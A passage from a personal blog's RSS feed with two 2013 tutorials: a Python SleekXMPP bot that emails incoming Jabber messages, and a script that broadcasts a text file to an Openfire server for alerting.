&lt;h3 id=&#34;so-why-would-you-even-want-this&#34;&gt;So, why would you even want this..?&lt;/h3&gt;

&lt;p&gt;Well, to be honest, I am not really sure of many use cases for this, however maybe someone, somewhere will need to do something like this, and I would have done my deed and saved someone some time ::sun::&lt;/p&gt;

&lt;h3 id=&#34;introducing-sleekxmpp&#34;&gt;Introducing SleekXMPP&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;http://sleekxmpp.com/&#34;&gt;SleekXMPP&lt;/a&gt; is a python XMPP framework. It takes a bit to get your head around it, but once you have some basics covered its quite a rewarding library to work with. :) To start, you need to install 2 dependencies. Python Mailer and SleekXMPP itself. Something like &lt;code&gt;pip install mailer sleekxmpp&lt;/code&gt; or for the older school, &lt;code&gt;easy_install sleekxmpp mailer&lt;/code&gt; should do the trick. It can&amp;rsquo;t hurt to check if the distro you use has these are packages already too.&lt;/p&gt;

&lt;h3 id=&#34;configuration-and-testing-time&#34;&gt;Configuration and testing time&lt;/h3&gt;

&lt;p&gt;Once the install completes, do a quick check to see if everything is ok, Try to import the modules. They should return no errors. If they do, check that the installation of the previously mentioned dependencies were successful.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;% python2
Python 2.7.5 (default, May 12 2013, 12:00:47)
[GCC 4.8.0 20130502 (prerelease)] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; import sleekxmpp
&amp;gt;&amp;gt;&amp;gt; import mailer
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, you need a &lt;em&gt;bot&lt;/em&gt; account to use. Provision a user on your jabber server for the bot and test with a jabber client that it works.&lt;/p&gt;

&lt;h3 id=&#34;ok-code&#34;&gt;Ok, code&lt;/h3&gt;

&lt;p&gt;Next, we take the &lt;a href=&#34;http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot&#34;&gt;sample&lt;/a&gt; echobot from the SleekXMPP website, and modify it slightly to handle our incoming message by sending a email, instead of simply replying back what we have sent.&lt;/p&gt;

&lt;p&gt;First, we import the mailer requirements with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from mailer import Mailer
from mailer import Message
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above can be placed right after the option parser has been imported. Then, we only need to change the &lt;code&gt;message&lt;/code&gt; method within the &lt;code&gt;EchoBot&lt;/code&gt; class really:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

# Shameless SleekXMPP modification of the
# echobot http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot

if msg[&#39;type&#39;] in (&#39;chat&#39;, &#39;normal&#39;):

   print &amp;quot;Received Message:\n%(body)s&amp;quot; % msg

   # Mail the message Received
   message = Message(From=&amp;quot;&#39;Jabber Email Service&#39; &amp;lt;someone@domain.com&amp;gt;&amp;quot;,
         To=[&amp;quot;someone@domain.com&amp;quot;],
         Subject=&amp;quot;[Jabber Message Received] From: %s&amp;quot; % msg[&amp;quot;from&amp;quot;])
   themessage = msg[&amp;quot;body&amp;quot;]
   themessage = themessage.decode(&#39;unicode_escape&#39;).encode(&#39;ascii&#39;,&#39;ignore&#39;)
   message.Body = themessage

   sender = Mailer(&amp;quot;127.0.0.1&amp;quot;)
   sender.send(message)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A complete modified example that includes the above changes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Shameless SleekXMPP modification of the
# echobot http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot

&amp;quot;&amp;quot;&amp;quot;
    SleekXMPP: The Sleek XMPP Library
    Copyright (C) 2010  Nathanael C. Fritz
    This file is part of SleekXMPP.

    See the file LICENSE for copying permission.
&amp;quot;&amp;quot;&amp;quot;

import sys
import logging
import getpass
from optparse import OptionParser

from mailer import Mailer
from mailer import Message

import sleekxmpp

# Python versions before 3.0 do not use UTF-8 encoding
# by default. To ensure that Unicode is handled properly
# throughout SleekXMPP, we will set the default encoding
# ourselves to UTF-8.
if sys.version_info &amp;lt; (3, 0):
    reload(sys)
    sys.setdefaultencoding(&#39;utf8&#39;)
else:
    raw_input = input


class EchoBot(sleekxmpp.ClientXMPP):

    &amp;quot;&amp;quot;&amp;quot;
    A simple SleekXMPP bot that will echo messages it
    receives, along with a short thank you message.
    &amp;quot;&amp;quot;&amp;quot;

    def __init__(self, jid, password):
        sleekxmpp.ClientXMPP.__init__(self, jid, password)

        # The session_start event will be triggered when
        # the bot establishes its connection with the server
        # and the XML streams are ready for use. We want to
        # listen for this event so that we we can initialize
        # our roster.
        self.add_event_handler(&amp;quot;session_start&amp;quot;, self.start)

        # The message event is triggered whenever a message
        # stanza is received. Be aware that that includes
        # MUC messages and error messages.
        self.add_event_handler(&amp;quot;message&amp;quot;, self.message)

    def start(self, event):
        &amp;quot;&amp;quot;&amp;quot;
        Process the session_start event.

        Typical actions for the session_start event are
        requesting the roster and broadcasting an initial
        presence stanza.

        Arguments:
            event -- An empty dictionary. The session_start
                     event does not provide any additional
                     data.
        &amp;quot;&amp;quot;&amp;quot;
        self.send_presence()
        self.get_roster()
        self.nick = &amp;quot;jabberMailBot&amp;quot;

    def message(self, msg):
        &amp;quot;&amp;quot;&amp;quot;
        Process incoming message stanzas. Be aware that this also
        includes MUC messages and error messages. It is usually
        a good idea to check the messages&#39;s type before processing
        or sending replies.

        Arguments:
            msg -- The received message stanza. See the documentation
                   for stanza objects and the Message stanza to see
                   how it may be used.
        &amp;quot;&amp;quot;&amp;quot;
        if msg[&#39;type&#39;] in (&#39;chat&#39;, &#39;normal&#39;):

            print &amp;quot;Received Message:\n%(body)s&amp;quot; % msg

            # Mail the message Received
            message = Message(From=&amp;quot;&#39;Jabber Email Service&#39; &amp;lt;someone@domain.com&amp;gt;&amp;quot;,
                  To=[&amp;quot;someone@domain.com&amp;quot;],
                  Subject=&amp;quot;[Jabber Message Received] From: %s&amp;quot; % msg[&amp;quot;from&amp;quot;])
            themessage = msg[&amp;quot;body&amp;quot;]
            themessage = themessage.decode(&#39;unicode_escape&#39;).encode(&#39;ascii&#39;,&#39;ignore&#39;)
            message.Body = themessage

            sender = Mailer(&amp;quot;127.0.0.1&amp;quot;)
            sender.send(message)

if __name__ == &#39;__main__&#39;:
    # Setup the command line arguments.
    optp = OptionParser()

    # Output verbosity options.
    optp.add_option(&#39;-q&#39;, &#39;--quiet&#39;, help=&#39;set logging to ERROR&#39;,
                    action=&#39;store_const&#39;, dest=&#39;loglevel&#39;,
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option(&#39;-d&#39;, &#39;--debug&#39;, help=&#39;set logging to DEBUG&#39;,
                    action=&#39;store_const&#39;, dest=&#39;loglevel&#39;,
                    const=logging.DEBUG, default=logging.INFO)
    optp.add_option(&#39;-v&#39;, &#39;--verbose&#39;, help=&#39;set logging to COMM&#39;,
                    action=&#39;store_const&#39;, dest=&#39;loglevel&#39;,
                    const=5, default=logging.INFO)

    # JID and password options.
    optp.add_option(&amp;quot;-j&amp;quot;, &amp;quot;--jid&amp;quot;, dest=&amp;quot;jid&amp;quot;,
                    help=&amp;quot;JID to use&amp;quot;)
    optp.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--password&amp;quot;, dest=&amp;quot;password&amp;quot;,
                    help=&amp;quot;password to use&amp;quot;)

    opts, args = optp.parse_args()

    # Setup logging.
    logging.basicConfig(level=opts.loglevel,
                        format=&#39;%(levelname)-8s %(message)s&#39;)

    if opts.jid is None:
        opts.jid = raw_input(&amp;quot;Username: &amp;quot;)
    if opts.password is None:
        opts.password = getpass.getpass(&amp;quot;Password: &amp;quot;)

    # Setup the EchoBot and register plugins. Note that while plugins may
    # have interdependencies, the order in which you register them does
    # not matter.
    xmpp = EchoBot(opts.jid, opts.password)
    xmpp.register_plugin(&#39;xep_0030&#39;) # Service Discovery
    xmpp.register_plugin(&#39;xep_0004&#39;) # Data Forms
    xmpp.register_plugin(&#39;xep_0060&#39;) # PubSub
    xmpp.register_plugin(&#39;xep_0199&#39;) # XMPP Ping

    # If you are working with an OpenFire server, you may need
    # to adjust the SSL version used:
    # xmpp.ssl_version = ssl.PROTOCOL_SSLv3

    # If you want to verify the SSL certificates offered by a server:
    # xmpp.ca_certs = &amp;quot;path/to/ca/cert&amp;quot;

    # Connect to the XMPP server and start processing XMPP stanzas.
    if xmpp.connect():
        # If you do not have the dnspython library installed, you will need
        # to manually specify the name of the server if it does not match
        # the one in the JID. For example, to use Google Talk you would
        # need to use:
        #
        # if xmpp.connect((&#39;talk.google.com&#39;, 5222)):
        #     ...
        xmpp.process(block=True)
        print(&amp;quot;Done&amp;quot;)
    else:
        print(&amp;quot;Unable to connect.&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;so-how-do-i-actually-use-this-thing-i-just-saw&#34;&gt;So how do I actually use this thing I just saw?&lt;/h3&gt;

&lt;p&gt;Take the complete example and save it to a file like &lt;code&gt;bot.py&lt;/code&gt;. Then, run it!
The complete example will echo the message just before it attempts to mail it. You can comment out line &lt;strong&gt;86&lt;/strong&gt; to stop this from happening and run the script with the &lt;code&gt;-q&lt;/code&gt; argument once you are happy all is working.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;% python bot.py -j &amp;quot;myEmailbot@myJabberServer.local&amp;quot;
Password:
INFO     Negotiating TLS
INFO     Using SSL version: 3
INFO     CERT: Time until certificate expiration: 952 days, 6:46:01.014041

Received Message:
This is a test message that will be mailed :D
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;things-to-note&#34;&gt;Things to note.&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Even though the script allows you to specify a &lt;code&gt;-p&lt;/code&gt; argument, I would highly discourage the usage of this. Any person that has access to your machine, be it legitimate or not, would then see your bot&amp;rsquo;s process, with the password in the &lt;code&gt;ps&lt;/code&gt; output!&lt;/li&gt;
&lt;li&gt;Ensure the SMTP server specified in line &lt;strong&gt;96&lt;/strong&gt; of the complete example allows yo to relay! Change it if needed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;test-d&#34;&gt;Test! :D&lt;/h3&gt;

&lt;p&gt;Send your bot a message and see if your mail arrives ^^&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt;: Modify the message encoding to ASCII as the utf8 stuff seems to barf out sometimes :|&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>How To: Extremely simple python Jabber Broadcast Bot</title>
      <link>https://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot/</link>
      <pubDate>Sat, 25 May 2013 00:00:00 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot/</guid>
      <description>

&lt;h3 id=&#34;bots-bots-bots&#34;&gt;Bots! Bots! Bots!&lt;/h3&gt;

&lt;p&gt;Generally speaking, a &amp;ldquo;bot&amp;rdquo; is something that like &lt;em&gt;does work for you&lt;/em&gt;. But, for this purpose, the need for a jabber bot came from the fact that I had to deal with a lot of email on a daily basis. This large amount of mail sometimes would cause me to completely miss critical mail alerts. Realising later that I could have prevented a catastrophe if I didn&amp;rsquo;t miss that &lt;strong&gt;one&lt;/strong&gt; email was just not on anymore. So, I started investigating ways to get the &lt;em&gt;important&lt;/em&gt; stuff delivered faster.&lt;/p&gt;

&lt;p&gt;As a team at work, we have long gone dropped the whole Skype group chat thing for our own Jabber server. My privacy related concerns back then was recently heightened &lt;a href=&#34;http://lists.randombit.net/pipermail/cryptography/2013-May/004224.html&#34;&gt;here&lt;/a&gt; when a trap URL received a HEAD request from &lt;strong&gt;65.52.100.214&lt;/strong&gt;. The user that received the URL in a chat was under strict instructions not to actually click it&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;so-how-do-we-do-this&#34;&gt;So, how do we do this?&lt;/h3&gt;

&lt;p&gt;We implemented a &lt;a href=&#34;http://www.igniterealtime.org/projects/openfire/&#34;&gt;Openfire Server&lt;/a&gt; that was really easy to setup and get going. Whats really nice about this Jabber server is that it supports plugins, some of which you can simply install via the web interface.&lt;/p&gt;

&lt;p&gt;One such plugin that was installed is called the &lt;a href=&#34;http://www.igniterealtime.org/projects/openfire/plugins/broadcast/readme.html&#34;&gt;broadcast&lt;/a&gt; plugin. This allows you to broadcast a message to all users on the server or those in defined groups.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/openfire_screenshot.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once this plugin is installed, some minor configuration is required to allow the broadcasting feature to work. In no way is this an extensive guide on the power of the plugin, but for the purpose of this post well just quickly rush over it.&lt;/p&gt;

&lt;p&gt;Head over to &lt;em&gt;Server&lt;/em&gt; -&amp;gt; &lt;em&gt;Server Manager&lt;/em&gt; -&amp;gt; &lt;em&gt;System Properties&lt;/em&gt;. From here you need to add the fields that are not there with the &lt;strong&gt;plugin.broadcast.&lt;/strong&gt; prefix. Don&amp;rsquo;t worry if they are not there, just add them.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/openfire_screenshot2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The above is just a sample of a working configuration. Feel free to play around more with different setups.&lt;/p&gt;

&lt;p&gt;With everything configured, you should now be able to send a message to something like &lt;em&gt;all@broadcast.jabber.server&lt;/em&gt;. In my configuration, &lt;em&gt;plugin.broadcast.all2offline&lt;/em&gt; is set to &lt;strong&gt;true&lt;/strong&gt;. So, when a message is broadcasted and I was offline, I&amp;rsquo;ll receive the broadcast as soon as I&amp;rsquo;m back :)&lt;/p&gt;

&lt;h3 id=&#34;introducing-jabbersend-py&#34;&gt;Introducing jabbersend.py&lt;/h3&gt;

&lt;p&gt;With our jabber server now configured and working, we are ready to start automating things. From here we need two things. Something that will broadcast for us, and something &lt;em&gt;to&lt;/em&gt; broadcast. The &lt;em&gt;what to broadcast&lt;/em&gt; is entirely up to you, as the script will accept a text file to broadcast.&lt;/p&gt;

&lt;p&gt;The only dependency you probably need to satisfy will be &lt;code&gt;xmpp&lt;/code&gt;. This should be easily doable with something like &lt;code&gt;easy_install xmpp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
import sys,os,xmpp,time

# check the received arguments
if len(sys.argv) &amp;lt; 2:
    print &amp;quot;Syntax: jabbersend.py JID textfile&amp;quot;
    sys.exit(0)

# set the values to work with and read the file
tojid=sys.argv[1]
m = open(sys.argv[2],&#39;r&#39;)
array = m.readlines()
m.close()

msg=&amp;quot;&amp;quot;
for record in array:
        msg = msg + record

# configure your jabber account for the bot here.
username = &#39;jabber_bot@jabber.server&#39; # from whom will the message be sent
password = &#39;jabber_bot_secret_password&#39;

jid=xmpp.protocol.JID(username)

# for debugging purposes, uncomment the below line so that &#39;debug&#39; is 1.
# This makes the script very verbose though, but its helpful if you stuck ^^
#cl=xmpp.Client(jid.getDomain(),debug=1)
cl=xmpp.Client(jid.getDomain(),debug=[])

# Sadly I don&#39;t have a valid certificate for my jabber server, so this had to
# be set to False. I do however recommend, if you can, to get a valid certificate
# and enable this
con=cl.connect(secure=False) # Set this to validate the servers certificate.
if not con:
    print &amp;quot;Could not connect&amp;quot;
    sys.exit()

# authenticate the client
auth=cl.auth(jid.getNode(),password,resource=jid.getResource())
if not auth:
    print &amp;quot;Authentication failed&amp;quot;
    sys.exit()

# send the message
id=cl.send(xmpp.protocol.Message(tojid, msg))

# some older servers will not send the message if you disconnect immediately
time.sleep(1)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;we-have-the-code-now-use-it&#34;&gt;We have the code, now use it!&lt;/h3&gt;

&lt;p&gt;Save this code to something like &lt;code&gt;jabbersend.py&lt;/code&gt; and execute it like this:
&lt;code&gt;python jabbersend.py all@broadcast.jabber.server message_file.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If all went OK, you should have received a message from jabber_bot@jabber.server :P&lt;/p&gt;

&lt;p&gt;Our internal implementation of this has been used in multiple areas. From broadcasting OSSEC alerts to broadcasting important events from cronjobs.
The OSSEC broadcasting I&amp;rsquo;ll blog a little later, but you can obviously see the value that something like this brings. No more missing emails, if I receive a message from the bot, its important :)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>